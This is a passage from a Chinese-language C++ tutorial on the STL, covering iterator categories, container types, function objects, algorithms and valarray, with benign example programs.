std::find, std::accumulate。istream_iterator 是一个例子。 输出迭代器 (Output Iterator): 只能向前移动 (++)。 只能写入 (*it = value) 所指向的位置一次。 不支持比较。 用于将结果写入目标，例如 std::copy 的第三个参数。ostream_iterator 是一个例子。 前向迭代器 (Forward Iterator): 结合了输入和输出迭代器的部分能力（但更强）。 可以向前移动 (++)。 可以多次读取 (*) 同一个元素。 可以多次写入 (*it = value) 同一个元素（如果指向的是非 const 元素）。 支持比较相等 (==, !=)。 用于需要多次遍历同一范围的算法。std::forward_list 提供前向迭代器。unordered 容器也提供至少前向迭代器。 双向迭代器 (Bidirectional Iterator): 继承了前向迭代器的所有能力。 增加了向后移动 (--) 的能力。 std::list, std::set, std::map 提供双向迭代器。 随机访问迭代器 (Random Access Iterator): 最强大的迭代器，继承了双向迭代器的所有能力。 支持算术运算：it + n, it - n, it += n, it -= n (快速移动到任意位置)。 支持下标运算：it[n] (等价于 *(it + n))。 支持比较大小 (&lt;, &gt;, &lt;=, &gt;=)。 支持计算两个迭代器之间的距离 (it2 - it1)。 std::vector, std::deque, std::array, std::string 提供随机访问迭代器。普通指针也是随机访问迭代器。 算法会根据其需要指定它所要求的最低迭代器类别。例如，std::reverse 需要双向迭代器，而 std::sort 需要随机访问迭代器（因为它需要高效地交换任意位置的元素）。 16.4.3 迭代器层次结构这五种迭代器类型形成了一个层次结构，后面的类别拥有前面类别所有（或等价）的功能： 1234567Input Iterator Output Iterator \\ &#x2F; Forward Iterator | Bidirectional Iterator | Random Access Iterator 这意味着，如果一个算法需要前向迭代器，你可以传递给它前向、双向或随机访问迭代器。但如果算法需要随机访问迭代器，你就不能传递给它双向或前向迭代器。 16.4.4 概念、改进和模型 (Concepts, Refinements, and Models)STL 的设计基于概念 (Concepts) 的思想。一个概念是一组对类型的要求（包括类型必须提供的操作、类型别名、语义保证等）。 概念 (Concept): 例如，“迭代器”是一个概念，“可排序 (Sortable)”是一个概念，“容器”是一个概念。 改进 (Refinement): 一个概念可以是另一个概念的改进。例如，“前向迭代器”是“输入迭代器”的改进，因为它增加了可以多次读取的要求。“双向迭代器”是“前向迭代器”的改进，增加了向后移动的要求。 模型 (Model): 一个具体的类型如果满足了某个概念的所有要求，就称为该概念的一个**模型 (Model)**。例如，std::vector&lt;int&gt;::iterator 是“随机访问迭代器”概念的一个模型。int 类型是“可相加 (Additive)”概念的一个模型。 虽然 C++ 标准本身直到 C++20 才正式引入语言级别的 Concepts 支持，但 STL 从一开始就是基于这种思想设计的。算法的文档通常会说明它对模板参数（特别是迭代器类型）的概念要求。例如，std::sort 要求其迭代器参数是“随机访问迭代器 (RandomAccessIterator)”的模型，并且元素类型是“可小于比较 (LessThanComparable)”和“可移动构造/赋值 (MoveConstructible/MoveAssignable)”的模型。 理解概念有助于我们知道哪些算法可以用于哪些容器或数据类型。 16.4.5 容器种类STL 提供了多种容器类型，可以大致分为几类： 顺序容器 (Sequence Containers): 元素按照线性顺序排列。 std::vector: 动态数组，连续内存，随机访问快，尾部插入/删除快，中间插入/删除慢。 std::deque (Double-Ended Queue): 双端队列，非连续内存（分块），支持随机访问，头部和尾部插入/删除都快，中间插入/删除慢。 std::list: 双向链表，非连续内存，不支持随机访问（访问元素需遍历），任何位置插入/删除都快 (O(1))。 std::forward_list (C++11): 单向链表，比 list 开销更小，只支持向前遍历，任何位置插入/删除快。 std::array (C++11): 固定大小数组，是对 C 风格数组的封装，连续内存，支持随机访问，大小在编译时确定，不能动态改变。 关联容器 (Associative Containers): 元素根据键 (Key) 进行排序和存储，查找速度通常较快 (对数时间复杂度 O(log N))。 std::set: 存储唯一元素的集合，自动排序。 std::map: 存储**键-值对 (Key-Value Pair)**，键是唯一的，根据键自动排序。 std::multiset: 类似于 set，但允许存储重复元素。 std::multimap: 类似于 map，但允许存储具有相同键的多个键-值对。 无序关联容器 (Unordered Associative Containers) (C++11): 元素根据键的哈希值 (Hash Value) 存储在桶 (Bucket) 中，不保证元素顺序。插入、删除和查找的平均时间复杂度通常为常数时间 O(1)，但最坏情况下可能退化为线性时间 O(N)。 std::unordered_set: 存储唯一元素的哈希集合。 std::unordered_map: 存储键-值对的哈希映射，键唯一。 std::unordered_multiset: 允许重复元素的哈希集合。 std::unordered_multimap: 允许重复键的哈希映射。 容器适配器 (Container Adapters): 基于其他容器类型实现特定接口（通常限制了底层容器的功能）。 std::stack: 后进先出 (LIFO) 栈，默认基于 deque 实现。 std::queue: 先进先出 (FIFO) 队列，默认基于 deque 实现。 std::priority_queue: 优先级队列，最大（或最小）元素总是在顶部，默认基于 vector 实现。 选择哪种容器取决于具体需求，如是否需要排序、是否需要快速随机访问、插入/删除的频率和位置、是否允许重复元素等。 16.4.6 关联容器关联容器的核心特点是元素根据键自动排序。它们通常使用某种形式的平衡二叉搜索树（如红黑树）来实现，保证了插入、删除和查找操作的时间复杂度为 O(log N)。 std::set&lt;Key&gt;: 存储类型为 Key 的唯一元素。 元素自动按升序排序（默认使用 operator&lt;）。 主要用于快速检查元素是否存在。 123456789101112131415161718192021222324#include &lt;set&gt;#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::set&lt;std::string&gt; unique_words; unique_words.insert(&quot;apple&quot;); unique_words.insert(&quot;banana&quot;); unique_words.insert(&quot;apple&quot;); // 重复插入会被忽略 std::cout &lt;&lt; &quot;Set contains: &quot;; for (const auto&amp; word : unique_words) &#123; std::cout &lt;&lt; word &lt;&lt; &quot; &quot;; // 输出: apple banana (已排序) &#125; std::cout &lt;&lt; std::endl; if (unique_words.count(&quot;banana&quot;)) &#123; // count() 返回 0 或 1 std::cout &lt;&lt; &quot;banana is in the set.\\n&quot;; &#125; auto it = unique_words.find(&quot;cherry&quot;); // find() 返回迭代器 if (it == unique_words.end()) &#123; std::cout &lt;&lt; &quot;cherry is not in the set.\\n&quot;; &#125;&#125; std::map&lt;Key, Value&gt;: 存储 std::pair&lt;const Key, Value&gt; 类型的键-值对。 键 Key 必须是唯一的。 元素根据键自动排序。 可以通过键快速查找对应的值。 12345678910111213141516171819202122232425262728293031#include &lt;map&gt;#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::map&lt;std::string, int&gt; word_counts; // 插入方式 word_counts.insert(&#123;&quot;apple&quot;, 3&#125;); word_counts.insert(std::make_pair(&quot;banana&quot;, 5)); word_counts[&quot;cherry&quot;] = 2; // 使用 operator[] 插入或更新 word_counts[&quot;apple&quot;] = 4; // 更新 apple 的值 std::cout &lt;&lt; &quot;Map contains:\\n&quot;; for (const auto&amp; pair : word_counts) &#123; // pair.first 是 const Key, pair.second 是 Value std::cout &lt;&lt; pair.first &lt;&lt; &quot;: &quot; &lt;&lt; pair.second &lt;&lt; std::endl; // 输出按键排序: apple: 4, banana: 5, cherry: 2 &#125; std::cout &lt;&lt; &quot;Count for banana: &quot; &lt;&lt; word_counts[&quot;banana&quot;] &lt;&lt; std::endl; // 使用 [] 访问 auto it = word_counts.find(&quot;grape&quot;); if (it == word_counts.end()) &#123; std::cout &lt;&lt; &quot;grape not found.\\n&quot;; &#125; // 注意：如果使用 operator[] 访问不存在的键，会自动插入一个具有默认值的元素！ std::cout &lt;&lt; &quot;Count for grape (after []): &quot; &lt;&lt; word_counts[&quot;grape&quot;] &lt;&lt; std::endl; // 输出 0，并插入了 &#123;&quot;grape&quot;, 0&#125;&#125; std::multiset&lt;Key&gt;: 允许存储重复的键，元素自动排序。 std::multimap&lt;Key, Value&gt;: 允许存储重复的键，键值对根据键自动排序。查找会返回一个范围（所有具有该键的元素）。 16.4.7 无序关联容器（C++11）无序关联容器使用哈希表 (Hash Table) 实现，元素不保证任何特定顺序。它们通过计算键的哈希值来确定元素存储的位置（桶）。 优点: 插入、删除和查找的平均时间复杂度为 O(1)，通常比关联容器更快。 缺点: 最坏情况下的时间复杂度为 O(N)（当发生大量哈希冲突时）。 元素是无序的。 需要为键类型提供哈希函数和相等比较操作（标准库为基本类型和 string 等提供了默认实现）。 哈希表操作可能会导致迭代器失效。 std::unordered_set&lt;Key&gt;: 存储唯一键的哈希集合。 std::unordered_map&lt;Key, Value&gt;: 存储唯一键值对的哈希映射。 std::unordered_multiset&lt;Key&gt;: 允许重复键的哈希集合。 std::unordered_multimap&lt;Key, Value&gt;: 允许重复键的哈希映射。 示例 (unordered_map): 1234567891011121314151617181920212223242526#include &lt;unordered_map&gt;#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::unordered_map&lt;std::string, int&gt; phonebook; phonebook[&quot;Alice&quot;] = 12345; phonebook[&quot;Bob&quot;] = 67890; phonebook.insert(&#123;&quot;Charlie&quot;, 54321&#125;); std::cout &lt;&lt; &quot;Phonebook (order not guaranteed):\\n&quot;; for (const auto&amp; entry : phonebook) &#123; std::cout &lt;&lt; entry.first &lt;&lt; &quot;: &quot; &lt;&lt; entry.second &lt;&lt; std::endl; &#125; std::cout &lt;&lt; &quot;Bob&#x27;s number: &quot; &lt;&lt; phonebook[&quot;Bob&quot;] &lt;&lt; std::endl; if (phonebook.count(&quot;David&quot;)) &#123; // count() 返回 0 或 1 std::cout &lt;&lt; &quot;David found.\\n&quot;; &#125; else &#123; std::cout &lt;&lt; &quot;David not found.\\n&quot;; &#125; return 0;&#125; 无序容器在不需要元素排序且注重平均查找性能的场景下非常有用，例如实现缓存、快速查找表等。 16.5 函数对象在 STL 中，许多算法（如 sort, find_if, for_each）不仅可以通过迭代器指定操作的范围，还可以接受一个额外的参数来定制其行为。这个参数通常是一个可调用 (Callable) 的实体，用于指定比较规则、判断条件或要执行的操作。 除了普通的函数指针，C++ 还提供了一种强大的可调用实体：**函数对象 (Function Object)**，也称为 **函数符 (Functor)**。 16.5.1 函数符概念函数对象（或函数符）是一个重载了函数调用运算符 operator() 的类的对象。这意味着你可以像调用函数一样使用这个对象。 基本结构: 1234567891011121314151617181920#include &lt;iostream&gt;// 定义一个函数对象类class MyFunctor &#123;public: // 重载 operator() void operator()(int x) const &#123; // 可以是 const 成员函数 std::cout &lt;&lt; &quot;Functor called with value: &quot; &lt;&lt; x &lt;&lt; std::endl; &#125;&#125;;int main() &#123; MyFunctor f; // 创建函数对象 f(10); // 调用对象，就像调用函数一样 // 也可以临时创建并调用 MyFunctor()(20); return 0;&#125; 为什么使用函数对象？ 携带状态: 与普通函数不同，函数对象是对象，它可以拥有自己的成员变量（状态）。这些状态可以在多次调用之间保持，或者在创建时进行配置。这对于需要累加、计数或根据特定上下文操作的算法非常有用。 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt; // for for_each// 函数对象，用于计算总和并记录调用次数class SumAndCount &#123;private: int sum; int count;public: SumAndCount() : sum(0), count(0) &#123;&#125; // 初始化状态 void operator()(int x) &#123; sum += x; count++; &#125; int getSum() const &#123; return sum; &#125; int getCount() const &#123; return count; &#125;&#125;;int main() &#123; std::vector&lt;int&gt; nums = &#123;1, 2, 3, 4, 5&#125;; SumAndCount sac; // 创建带有状态的函数对象 // 将函数对象传递给 for_each 算法 // for_each 会对 nums 中的每个元素调用 sac.operator() // 注意：for_each 返回其函数对象参数的副本。 // 如果需要获取最终状态，需要接收返回值（或使用引用包装器） sac = std::for_each(nums.begin(), nums.end(), sac); std::cout &lt;&lt; &quot;Sum: &quot; &lt;&lt; sac.getSum() &lt;&lt; std::endl; // 输出 15 std::cout &lt;&lt; &quot;Count: &quot; &lt;&lt; sac.getCount() &lt;&lt; std::endl; // 输出 5 return 0;&#125; 内联可能性: 编译器通常更容易对函数对象的 operator() 进行内联 (inline) 优化，因为它在编译时是已知的。相比之下，通过函数指针调用函数通常会阻止内联，可能带来轻微的性能开销。 类型多样性: 每个函数对象类都是一个独立的类型。这允许我们通过模板特化或重载来为不同的函数对象提供不同的行为。 16.5.2 预定义的函数符标准库在 &lt;functional&gt; 头文件中提供了一系列常用的预定义函数符，可以直接使用，省去了自己编写简单操作类的麻烦。 常见的预定义函数符包括： 算术类: plus&lt;T&gt;: 执行 arg1 + arg2。 minus&lt;T&gt;: 执行 arg1 - arg2。 multiplies&lt;T&gt;: 执行 arg1 * arg2。 divides&lt;T&gt;: 执行 arg1 / arg2。 modulus&lt;T&gt;: 执行 arg1 % arg2。 negate&lt;T&gt;: 执行 -arg。 比较类: equal_to&lt;T&gt;: 执行 arg1 == arg2。 not_equal_to&lt;T&gt;: 执行 arg1 != arg2。 less&lt;T&gt;: 执行 arg1 &lt; arg2 (默认排序规则)。 greater&lt;T&gt;: 执行 arg1 &gt; arg2。 less_equal&lt;T&gt;: 执行 arg1 &lt;= arg2。 greater_equal&lt;T&gt;: 执行 arg1 &gt;= arg2。 逻辑类: logical_and&lt;T&gt;: 执行 arg1 &amp;&amp; arg2。 logical_or&lt;T&gt;: 执行 arg1 || arg2。 logical_not&lt;T&gt;: 执行 !arg。 使用示例: 这些预定义函数符常用于需要自定义比较或操作的 STL 算法。 123456789101112131415161718192021222324252627282930313233#include &lt;vector&gt;#include &lt;algorithm&gt; // for sort, count_if#include &lt;functional&gt; // 包含预定义函数符#include &lt;iostream&gt;int main() &#123; std::vector&lt;int&gt; nums = &#123;5, 2, 8, 1, 9, 4&#125;; // 使用 greater&lt;int&gt; 进行降序排序 std::sort(nums.begin(), nums.end(), std::greater&lt;int&gt;()); // 等价于 std::sort(nums.begin(), nums.end(), [](int a, int b)&#123; return a &gt; b; &#125;); std::cout &lt;&lt; &quot;Sorted descending: &quot;; for (int n : nums) &#123; std::cout &lt;&lt; n &lt;&lt; &quot; &quot;; // 输出: 9 8 5 4 2 1 &#125; std::cout &lt;&lt; std::endl; // 使用 less&lt;int&gt; 和 bind (或 lambda) 来查找小于 5 的元素数量 // C++11 之前的做法可能使用 bind1st/bind2nd (已废弃) 或 boost::bind // C++11 及以后，lambda 更常用： int count_less_than_5 = std::count_if(nums.begin(), nums.end(), [](int x)&#123; return x &lt; 5; &#125;); std::cout &lt;&lt; &quot;Count less than 5: &quot; &lt;&lt; count_less_than_5 &lt;&lt; std::endl; // 输出 3 (4, 2, 1) // 使用预定义函数符和 lambda 结合 (虽然有点绕) int threshold = 5; count_less_than_5 = std::count_if(nums.begin(), nums.end(), [threshold](int x)&#123; return std::less&lt;int&gt;()(x, threshold); &#125;); std::cout &lt;&lt; &quot;Count less than 5 (lambda+functor): &quot; &lt;&lt; count_less_than_5 &lt;&lt; std::endl; // 输出 3 return 0;&#125; 16.5.3 自适应函数符和函数适配器 (旧概念)在 C++11 引入 lambda 表达式之前，为了更灵活地组合和使用函数符，STL 提供了一些更复杂的机制，如自适应函数符 (Adaptable Functors) 和**函数适配器 (Function Adapters)**。 自适应函数符: 除了 operator()，还提供了一些嵌套的 typedef（如 result_type, first_argument_type, second_argument_type），使得适配器能够了解函数符的参数和返回类型。预定义的函数符大多是自适应的。 函数适配器: 用于修改或绑定函数符的参数。 绑定器 (Binders): 如 bind1st 和 bind2nd (在 C++11 中废弃，C++17 中移除)，用于将二元函数符的一个参数绑定到特定值，生成一个一元函数符。例如，bind1st(less&lt;int&gt;(), 5) 会创建一个判断参数是否小于 5 的一元函数符。 求反器 (Negators): 如 not1 和 not2 (在 C++17 中废弃)，用于对一元或二元谓词函数符的结果取反。例如，not1(is_even) 会创建一个判断是否为奇数的一元函数符。 成员函数适配器: 如 mem_fun 和 mem_fun_ref (在 C++11 中废弃，C++17 中移除)，用于将成员函数包装成可以被 STL 算法使用的函数对象。 现代 C++ 的替代方案: 这些旧的适配器机制比较复杂且用法受限。在现代 C++ (C++11 及以后) 中，它们的功能很大程度上被以下特性取代： std::bind (来自 &lt;functional&gt;): 一个更通用、更强大的绑定器，可以绑定普通函数、成员函数、函数对象，并灵活地指定参数占位符 (std::placeholders::_1, _2 等)。 Lambda 表达式: 提供了非常简洁和灵活的方式来就地定义匿名函数对象，可以捕获上下文变量，极大地简化了需要传递自定义逻辑给算法的场景。 12345678910111213141516171819202122#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;functional&gt; // for std::bind, std::less, std::placeholders#include &lt;iostream&gt;int main() &#123; std::vector&lt;int&gt; nums = &#123;9, 8, 5, 4, 2, 1&#125;; int threshold = 5; // 使用 std::bind (替代 bind1st/bind2nd) // 创建一个一元谓词，判断 x &lt; threshold auto less_than_threshold = std::bind(std::less&lt;int&gt;(), std::placeholders::_1, threshold); int count1 = std::count_if(nums.begin(), nums.end(), less_than_threshold); std::cout &lt;&lt; &quot;Count (bind): &quot; &lt;&lt; count1 &lt;&lt; std::endl; // 输出 3 // 使用 Lambda 表达式 (更简洁) int count2 = std::count_if(nums.begin(), nums.end(), [threshold](int x)&#123; return x &lt; threshold; &#125;); std::cout &lt;&lt; &quot;Count (lambda): &quot; &lt;&lt; count2 &lt;&lt; std::endl; // 输出 3 return 0;&#125; 虽然旧的适配器已被废弃，但理解函数对象的基本概念仍然很重要，因为它们是 STL 设计的基础，并且 lambda 表达式本质上就是编译器为我们自动生成的匿名函数对象。 16.6 算法STL 的第三个主要组件是**算法 (Algorithms)**。STL 提供了大量用于处理容器（或其他序列）中数据的模板函数，这些函数统称为算法。它们定义在 &lt;algorithm&gt; 头文件中（还有一些数值算法在 &lt;numeric&gt; 中）。 STL 算法是泛型的，它们通过迭代器作用于元素范围，而不依赖于特定容器的实现。这使得同一个算法可以应用于 vector, list, deque, C 风格数组等多种数据结构。 16.6.1 算法组STL 算法可以根据其功能大致分为几类： 非修改序列操作 (Non-modifying sequence operations): 这些算法检查序列中的元素，但不修改元素的值。它们通常返回一个迭代器、一个布尔值或一个计数值。 例如: find, find_if, count, count_if, equal, search, for_each。 修改序列操作 (Modifying sequence operations): 这些算法会修改序列中的元素值或元素顺序。 例如: copy, copy_if, move, transform, replace, replace_if, fill, generate, remove, remove_if, unique, reverse, rotate, random_shuffle (C++17 废弃), shuffle (C++11)。 排序和相关操作 (Sorting and related operations): 用于对序列进行排序或执行基于排序的操作。 例如: sort, stable_sort, partial_sort, nth_element, binary_search, lower_bound, upper_bound, equal_range, merge, inplace_merge。 数值操作 (Numeric operations): 定义在 &lt;numeric&gt; 头文件中，用于执行数值计算。 例如: accumulate, inner_product, partial_sum, adjacent_difference, iota (C++11)。 堆操作 (Heap operations): 用于将范围维护成堆结构。 例如: make_heap, push_heap, pop_heap, sort_heap。 最小/最大操作 (Min/max operations): 例如: min, max, minmax (C++11), min_element, max_element, minmax_element (C++11)。 排列操作 (Permutation operations): 例如: next_permutation, prev_permutation。 16.6.2 算法的通用特征 基于迭代器: 算法通常接受一对迭代器 first 和 last 作为参数，指定要操作的左闭右开区间 [first, last)**。last 指向的是要处理的最后一个元素的下一个**位置。 不检查边界: 大多数算法假定传入的迭代器范围是有效的。传递无效范围（如 end() 在 begin() 之前，或迭代器指向不同容器）会导致未定义行为。 不改变容器大小 (通常): 修改序列的算法（如 replace, remove）通常只覆盖或移动元素，而不改变容器的大小。例如，remove 只是将不被移除的元素移动到序列的前部，并返回一个指向新的逻辑末尾的迭代器，它不会真正删除容器中的元素。通常需要配合容器的 erase 方法来实际删除元素。 1234567891011121314151617181920212223242526#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;iostream&gt;int main() &#123; std::vector&lt;int&gt; v = &#123;1, 2, 3, 2, 4, 2, 5&#125;; int val_to_remove = 2; // 使用 remove 将所有不等于 2 的元素移到前面 auto new_end = std::remove(v.begin(), v.end(), val_to_remove); // v 现在可能是 &#123;1, 3, 4, 5, ?, ?, ?&#125; (问号代表未定义的值) // new_end 指向第一个问号的位置 (逻辑上的新末尾) std::cout &lt;&lt; &quot;Vector after remove (before erase): &quot;; for(int x : v) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; // 输出可能包含未定义值 std::cout &lt;&lt; &quot;\\nSize before erase: &quot; &lt;&lt; v.size() &lt;&lt; std::endl; // size 仍然是 7 // 使用 erase 删除从 new_end 到原始末尾的元素 v.erase(new_end, v.end()); std::cout &lt;&lt; &quot;Vector after erase: &quot;; for(int x : v) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; // 输出: 1 3 4 5 std::cout &lt;&lt; &quot;\\nSize after erase: &quot; &lt;&lt; v.size() &lt;&lt; std::endl; // size 变为 4 return 0;&#125; 接受函数对象/Lambda: 许多算法接受一个额外的参数（通常是最后一个参数），用于指定自定义的比较逻辑（如 sort 的比较函数）、判断条件（如 find_if, count_if 的谓词）或要执行的操作（如 for_each, transform 的函数）。这可以是函数指针、函数对象或 lambda 表达式。 谓词 (Predicate): 接受一个或两个参数并返回 bool 值的可调用实体。 一元谓词: bool pred(const Type&amp; a)，用于 find_if, count_if, remove_if 等。 二元谓词: bool pred(const Type&amp; a, const Type&amp; b)，用于 sort, unique 等，通常表示某种顺序关系（如“小于”）。 示例 (使用算法和 Lambda): 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;vector&gt;#include &lt;string&gt;#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;numeric&gt; // for accumulatestruct Person &#123; std::string name; int age;&#125;;int main() &#123; std::vector&lt;int&gt; nums = &#123;3, 1, 4, 1, 5, 9, 2, 6&#125;; // 1. find_if: 查找第一个偶数 auto it_even = std::find_if(nums.begin(), nums.end(), [](int x)&#123; return x % 2 == 0; &#125;); if (it_even != nums.end()) &#123; std::cout &lt;&lt; &quot;First even number: &quot; &lt;&lt; *it_even &lt;&lt; std::endl; // 输出 4 &#125; // 2. sort: 按绝对值大小排序 (自定义比较) std::vector&lt;int&gt; mixed = &#123;3, -1, 4, -1, 5, -9, 2, -6&#125;; std::sort(mixed.begin(), mixed.end(), [](int a, int b)&#123; return std::abs(a) &lt; std::abs(b); &#125;); std::cout &lt;&lt; &quot;Sorted by absolute value: &quot;; for(int x : mixed) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; // 输出: -1 -1 2 3 4 5 -6 -9 (或类似，取决于稳定排序) std::cout &lt;&lt; std::endl; // 3. transform: 将所有元素平方 std::vector&lt;int&gt; squares(nums.size()); // 目标容器需要足够大 std::transform(nums.begin(), nums.end(), squares.begin(), [](int x)&#123; return x * x; &#125;); std::cout &lt;&lt; &quot;Squares: &quot;; for(int x : squares) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; // 输出: 9 1 16 1 25 81 4 36 std::cout &lt;&lt; std::endl; // 4. accumulate: 计算所有元素的和 int sum = std::accumulate(nums.begin(), nums.end(), 0); // 0 是初始值 std::cout &lt;&lt; &quot;Sum: &quot; &lt;&lt; sum &lt;&lt; std::endl; // 输出 31 // 5. for_each: 对每个元素执行操作 std::vector&lt;Person&gt; people = &#123;&#123;&quot;Alice&quot;, 30&#125;, &#123;&quot;Bob&quot;, 25&#125;, &#123;&quot;Charlie&quot;, 35&#125;&#125;; std::cout &lt;&lt; &quot;People: &quot;; std::for_each(people.begin(), people.end(), [](const Person&amp; p)&#123; std::cout &lt;&lt; p.name &lt;&lt; &quot;(&quot; &lt;&lt; p.age &lt;&lt; &quot;) &quot;; &#125;); std::cout &lt;&lt; std::endl; // 输出: Alice(30) Bob(25) Charlie(35) return 0;&#125; 16.6.3 STL 和 string 类std::string 类虽然不是 STL 容器（它没有 value_type 等嵌套类型定义），但它提供了与 STL 兼容的接口，特别是迭代器 (begin(), end() 等）。因此，许多 STL 算法可以直接应用于 std::string 对象。 1234567891011121314151617181920212223242526272829303132#include &lt;string&gt;#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;cctype&gt; // for ::tolowerint main() &#123; std::string str = &quot;Hello World&quot;; // 使用 find 查找字符 auto it_l = std::find(str.begin(), str.end(), &#x27;l&#x27;); if (it_l != str.end()) &#123; // 计算索引 size_t index = std::distance(str.begin(), it_l); std::cout &lt;&lt; &quot;&#x27;l&#x27; first found at index: &quot; &lt;&lt; index &lt;&lt; std::endl; // 输出 2 &#125; // 使用 count_if 统计小写字母数量 int lower_count = std::count_if(str.begin(), str.end(), [](char c)&#123; return std::islower(c); &#125;); std::cout &lt;&lt; &quot;Lowercase count: &quot; &lt;&lt; lower_count &lt;&lt; std::endl; // 输出 9 // 使用 transform 将字符串转为小写 std::transform(str.begin(), str.end(), str.begin(), // 可以原地修改 [](unsigned char c)&#123; return std::tolower(c); &#125;); // 使用 unsigned char 避免负值问题 std::cout &lt;&lt; &quot;Lowercase string: &quot; &lt;&lt; str &lt;&lt; std::endl; // 输出: hello world // 使用 reverse 反转字符串 std::reverse(str.begin(), str.end()); std::cout &lt;&lt; &quot;Reversed string: &quot; &lt;&lt; str &lt;&lt; std::endl; // 输出: dlrow olleh return 0;&#125; 虽然 string 类本身也提供了许多成员函数（如 find, replace），但使用 STL 算法有时可以提供更通用或更强大的功能（例如配合 lambda 使用复杂条件）。 16.6.4 函数和容器方法有时，容器本身提供了与某个 STL 算法功能相似的成员函数。例如： list 有自己的 sort() 成员函数。 list 有自己的 remove() 和 remove_if() 成员函数。 list 有自己的 unique() 成员函数。 set, map 等关联容器有 find() 成员函数。 何时使用成员函数 vs. STL 算法？ 优先使用成员函数 (如果可用且满足需求): 容器的成员函数通常能更好地利用容器的内部结构进行优化。 例如，list::sort() 比 std::sort(list.begin(), list.end()) (如果 list 迭代器支持的话，但它不支持随机访问，所以不能用 std::sort) 更高效，因为它只需要重新链接节点，而不需要移动元素。 list::remove() 可以真正地从链表中删除节点并调整大小，而 std::remove 不能。 关联容器的 find() 成员函数利用其内部树或哈希结构，复杂度为 O(log N) 或 O(1)，而 std::find 是线性扫描 O(N)。 使用 STL 算法: 当容器没有提供相应的成员函数时。 当需要跨不同容器类型使用统一的算法时。 当需要更复杂的、成员函数不支持的操作逻辑时（例如，使用 std::remove_copy_if 将不满足条件的元素复制到另一个容器）。 16.6.5 使用 STL掌握 STL 的关键在于理解其三个核心组件如何协同工作： 选择合适的容器: 根据数据存储和访问的需求选择 vector, list, map, set 等。 使用迭代器指定范围: 通过 begin(), end() 或其他方式获取迭代器来定义算法操作的元素区间 [first, last)。 选择合适的算法: 从 &lt;algorithm&gt; 或 &lt;numeric&gt; 中选择能完成所需任务的算法。 提供自定义逻辑 (如果需要): 通过函数对象、lambda 表达式或函数指针向算法传递自定义的比较、判断或操作规则。 STL 是一个强大而灵活的库，熟练使用它可以大大提高 C++ 编程的效率和代码质量。建议多查阅文档（如 cppreference.com）了解各种容器、算法和迭代器的详细用法和要求。 16.7 其他库除了 string 类、智能指针和 STL 的核心组件（容器、算法、迭代器）之外，C++ 标准库还提供了许多其他有用的工具和类。本节将简要介绍 valarray 类和 C++11 引入的 initializer_list。 16.7.1 vector、valarray 和 array我们在前面章节已经接触过 vector 和 array，它们都提供了类似数组的功能，但各有特点。标准库还在 &lt;valarray&gt; 头文件中提供了另一个模板类 std::valarray，它主要设计用于数值计算，特别是对整个数组进行高效的元素级算术运算。 std::vector&lt;T&gt;: 头文件: &lt;vector&gt; 大小: 动态大小，可运行时增长和收缩。 内存: 保证元素连续存储。 主要特点: 通用的动态数组，支持丰富的 STL 算法，尾部插入/删除高效。 数值运算: 不直接支持元素级的算术运算符（例如，两个 vector 不能直接相加）。需要手动循环或使用 std::transform 等算法。 std::array&lt;T, N&gt; (C++11): 头文件: &lt;array&gt; 大小: 固定大小 N，在编译时确定。 内存: 保证元素连续存储，通常在栈上分配（如果是局部变量且大小适中）。 主要特点: 对 C 风格数组的类型安全封装，支持 STL 算法，性能与 C 风格数组相当。 数值运算: 与 vector 类似，不直接支持元素级运算。 std::valarray&lt;T&gt;: 头文件: &lt;valarray&gt; 大小: 动态大小（但通常在创建后大小变化不频繁）。 内存: 不保证连续存储（实现可能进行优化，如分块）。 主要特点: 专为数值计算设计。重载了算术运算符 (+, -, *, / 等）以支持元素级 (element-wise) 操作。还提供了许多数学函数（如 abs, sqrt, sin, cos 等）的应用版本。 STL 兼容性: 与标准 STL 算法的兼容性不如 vector 和 array 好（例如，其迭代器可能不是标准类别）。 比较总结: 特性 std::vector&lt;T&gt; std::array&lt;T, N&gt; (C++11) std::valarray&lt;T&gt; 头文件 &lt;vector&gt; &lt;array&gt; &lt;valarray&gt; 大小 动态 固定 (编译时) 动态 内存 连续 连续 不保证连续 主要用途 通用动态数组 C 数组的安全替代品 数值计算 元素级运算 否 否 是 STL 算法 完全兼容 完全兼容 有限兼容 valarray 示例: 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;valarray&gt;#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;numeric&gt; // for iotaint main() &#123; // 使用 valarray 进行元素级运算 std::valarray&lt;double&gt; v1 = &#123;1.0, 2.0, 3.0, 4.0&#125;; std::valarray&lt;double&gt; v2 = &#123;0.5, 0.5, 0.5, 0.5&#125;; std::valarray&lt;double&gt; v_sum, v_prod; v_sum = v1 + v2; // 元素级相加: &#123;1.5, 2.5, 3.5, 4.5&#125; v_prod = v1 * 2.0; // 每个元素乘以 2.0: &#123;2.0, 4.0, 6.0, 8.0&#125; std::cout &lt;&lt; &quot;v1 + v2 = &quot;; for (double x : v_sum) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; // C++11 range-based for 可能不直接支持 valarray // 使用传统循环或下标访问 // for (size_t i = 0; i &lt; v_sum.size(); ++i) std::cout &lt;&lt; v_sum[i] &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; std::cout &lt;&lt; &quot;v1 * 2.0 = &quot;; for (size_t i = 0; i &lt; v_prod.size(); ++i) std::cout &lt;&lt; v_prod[i] &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; // 应用数学函数 std::valarray&lt;double&gt; v_sqrt = std::sqrt(v_prod); // 对每个元素求平方根 std::cout &lt;&lt; &quot;sqrt(v_prod) = &quot;; for (size_t i = 0; i &lt; v_sqrt.size(); ++i) std::cout &lt;&lt; v_sqrt[i] &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; 